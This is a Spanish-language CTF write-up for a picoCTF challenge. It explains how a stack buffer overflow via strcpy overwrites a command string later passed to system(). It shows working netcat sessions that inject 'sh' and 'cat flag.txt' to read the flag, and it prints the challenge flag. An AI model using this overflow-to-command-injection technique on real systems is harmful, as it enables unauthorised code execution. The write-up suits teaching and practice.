#notas_hacking #binary_explotation #contests

## Descripción
A friendly program wants to greet you… but its goodbye might say more than it should. Can you convince it to reveal the flag?connect to the challenge instance `nc saffron-estate.picoctf.net 58185`. You can Download the program file [here](https://challenge-files.picoctf.net/c_saffron_estate/1906c02f8189e9d4b9db39c9c7ef7d96e0487fcb394dc070f03eb2f492e8585d/vuln). And source [code](https://challenge-files.picoctf.net/c_saffron_estate/1906c02f8189e9d4b9db39c9c7ef7d96e0487fcb394dc070f03eb2f492e8585d/vuln.c)
Hint: Look closely at how the program stores and uses your input.
## Solución
Parece que como el buffer solo es de 10 caracteres se podría desbordar pues no se valida el tamaño de la entrada, como copea el comando `"uname"` para  obtener el nombre del kernel a la cadena de caracteres `c`, con `system(c)` osea `system("uname")`  al agregar mas de los 10 caracteres  se puede modificar el contenido de `c` y cambiar el comando que se ejecuta.
```c
void fun(char *name, char *cmd) {
	char c[10];
	char buffer[10];
	
	strcpy(c, cmd);
	strcpy(buffer, name);
	
	printf("Goodbye, %s!\n", buffer);
	fflush(stdout);
	system(c);
}
```

```bash
┌──(kali㉿kali)-[~/pico/picoMini/Input_Injection]
└─$ nc saffron-estate.picoctf.net 50879
What is your name?
sergiogonzsh           
Goodbye, sergiogonzsh!
ls
flag.txt
cat flag.txt
picoCTF{0v3rfl0w_c0mm4nd_3766e70a}
exit
```
o también me funciono
```bash
┌──(kali㉿kali)-[~/pico/picoMini/Input_Injection]
└─$ nc saffron-estate.picoctf.net 55437
What is your name?
sergiogonzcat flag.txt
Goodbye, sergiogonzcat flag.txt!
picoCTF{0v3rfl0w_c0mm4nd_3766e70a}
```

## Notas adicionales
`uname` - Muestra información básica del sistema, como que es el sistema Linux.
`sh` -  intérprete de comandos que ejecuta comandos de un archivo, una cadena de texto o la entrada estándar
## Referencias
